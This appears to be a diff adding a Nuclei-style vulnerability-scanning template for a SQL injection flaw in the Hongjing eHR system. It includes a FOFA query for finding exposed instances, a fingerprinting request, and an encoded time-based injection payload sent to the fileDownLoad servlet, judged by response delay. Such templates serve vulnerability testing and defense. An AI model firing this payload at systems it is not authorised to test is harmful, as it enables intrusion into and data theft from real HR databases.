@@ -1,0 +1,45 @@
+id: poc-yaml-hongjing-ehr-filedownload-sqli
+info:
+  name: 宏景eHR fileDownLoad SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 宏景eHR
+    fofa: app="HJSOFT-HCM"
+
+http:
+  - raw:
+      - |
+        GET /templates/index/hcmlogon.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/css/hcm/login.css"
+
+  - raw:
+      - |
+        GET /servlet/performance/fileDownLoad?opt=hire&e01a1=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPVXZs4xJaPAATTP2HJFPAATTPI1J0SIw63TMGUPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: header
+        regex:
+          - "attachment;filename=\\\"fileDown"
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > 2 && duration < 4"
